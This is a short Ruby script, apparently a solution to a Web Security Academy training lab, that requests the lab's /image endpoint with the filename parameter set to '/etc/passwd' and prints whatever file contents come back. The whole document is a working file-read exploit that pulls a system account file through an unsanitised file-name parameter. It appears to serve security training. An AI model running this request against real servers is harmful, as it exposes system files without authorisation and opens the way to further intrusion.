require 'http'

url='https://0af600c00353bab582eb56ad00cc00e4.web-security-academy.net'

path='/image'

payload='/etc/passwd'

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
